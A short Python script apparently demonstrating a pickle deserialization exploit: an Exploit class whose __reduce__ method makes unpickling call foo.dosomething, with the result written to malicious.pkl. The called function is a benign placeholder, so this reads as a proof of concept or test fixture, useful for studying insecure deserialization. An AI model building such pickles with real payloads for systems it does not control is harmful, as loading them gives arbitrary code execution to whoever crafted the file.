import pickle
import os
import sys
import foo as foo
import itertools


class Exploit:
    def __reduce__(self):
        return (foo.dosomething, ("called the function",))

payload = pickle.dumps(Exploit())

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print("Malicious pickle written to file.")
